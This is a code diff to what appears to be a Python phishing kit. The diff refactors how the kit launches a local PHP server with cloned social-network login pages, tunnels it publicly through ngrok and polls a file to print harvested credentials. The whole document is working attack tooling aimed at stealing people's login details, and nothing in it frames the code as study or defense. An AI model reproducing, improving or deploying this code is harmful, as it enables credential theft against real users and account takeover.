@@ -10,15 +10,18 @@
 #                                                    #
 ######################################################
 
-from os import system
+from contextlib import contextmanager
+import json
+import requests
+import os
 from time import sleep
 from huepy import *
-from subprocess import getoutput
+import subprocess
     
 def runPhishing(social, custom):
-    system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
+    os.system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
     command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
-    system(command)
+    os.system(command)
     with open('base/Server/www/login.php') as f:
         read_data = f.read()   
     c = read_data.replace('<CUST0M>', custom)
@@ -33,28 +36,11 @@ def waitCreds():
             lines = creds.read().rstrip()
         if len(lines) != 0: 
             print(green('\n [*] Credentials found:\n %s' % lines))                        
-            system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
+            os.system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
         creds.close()
 
-def runNgrok():
-    system('./base/Server/ngrok http 1449 > /dev/null &')
-    ngrok_url = ''
-    check = 'curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh'
-    sleep(7)
-    while ngrok_url == '':
-        ngrok_url = getoutput(check)
-    print(green('\n [*] Ngrok URL: %s' % ngrok_url))
-    print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
-
 def runServer():
-    system("cd base/Server/www/ && php -n -S 127.0.0.1:1449 > /dev/null 2>&1 &")
-
-from contextlib import contextmanager
-import json
-import requests
-import subprocess
-import os
-from time import sleep
+    os.system("cd base/Server/www/ && php -n -S 127.0.0.1:1449 > /dev/null 2>&1 &")
 
 @contextmanager
 def ngrok_start():
@@ -63,7 +49,10 @@ def ngrok_start():
         try:
             ngrok_url = requests.get('http://127.0.0.1:4040/api/tunnels/command_line')
             if ngrok_url.status_code == 200:
-                yield json.loads(ngrok_url.text)['public_url']
+                public_url = json.loads(ngrok_url.text)['public_url']
+                print(green('\n [*] Ngrok URL: %s' % public_url))
+                print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
+                yield public_url
                 break
         except requests.exceptions.ConnectionError:
             sleep(.5)
